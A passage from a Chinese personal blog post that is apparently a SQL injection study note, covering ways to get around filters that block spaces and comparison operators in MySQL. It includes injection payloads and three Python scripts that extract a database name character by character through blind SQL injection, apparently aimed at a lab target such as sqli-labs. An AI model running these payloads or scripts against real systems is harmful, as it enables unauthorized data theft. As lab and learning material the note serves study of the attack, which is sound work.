<h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<h3 id="过滤比较符号绕过"><a href="#过滤比较符号绕过" class="headerlink" title="过滤比较符号绕过"></a>过滤比较符号绕过</h3><p>使用 in() 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;ip/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure>

<p>使用like绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>使用regexp绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://ip?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594#toc-6">SQL注入之Mysql注入姿势及绕过总结 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880">https://blog.csdn.net/qq_45521281/article/details/106647880</a></p>
</section>
    
        
        <h2 class="footline">
            <a href="/tags/注入/#注入">注入</a>
        </h2>
    

    <footer id="post-meta" class="clearfix">
        <a href="/about">
        <img class="avatar" src="/images/avatar.png">
        <div>
            <span class="dark">kpa1on&#39;s Blog</span>
            <span>keep passion！</span>
        </div>
        </a>
        <section id="sharing">
            <a title="Share to Twitter" class="twitter" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=https://kpa1on.github.io/2022/03/22/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/ - SQL注入学习 @"><span class="icon-twitter">tweet</span></a>
            <a title="Share to Facebook" class="facebook" href="#" onclick="
                window.open(
                  'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
                  'facebook-share-dialog',
                  'width=626,height=436');
                return false;"><span class="icon-facebook-sign">Share</span>
            </a>
        </section>
    </footer>


  <section id="comment">
    <button class="btn" id="loadcmts" onclick="cmts.load();">加载评论</button>
    <div id="gitment"></div>
    <script src='/js/gitment.browser.js'></script>
    <link rel="stylesheet" href=''>
    <script>
      var cmts={
        load:function cmts(){
          var gitment = new Gitment({
          
            id: "SQL注入学习",
          
            owner: "",
            repo: "",
            oauth: {
              client_id: "",
              client_secret: "",
            },
          })
          gitment.render('gitment');
          var loadcmt = document.getElementById("loadcmts");
          var imyourfather = loadcmt.parentNode;
          imyourfather.removeChild(loadcmts)
        }
      }
    </script>
  </section>


	<footer id="footer">
	<div id="social">
		<p class="small">©  kpa1on| Powered by Hexo & 
			<a target="_blank" rel="noopener" href="https://github.com/F0r3at/Lights"> Lights</a>
		</p>
	</div>
</footer>

</section>

	<script src="//cdnjs.loli.net/ajax/libs/instantclick/3.0.1/instantclick.min.js" data-no-instant></script>
	<script data-no-instant>
		
		InstantClick.init('mousedown');
	</script>



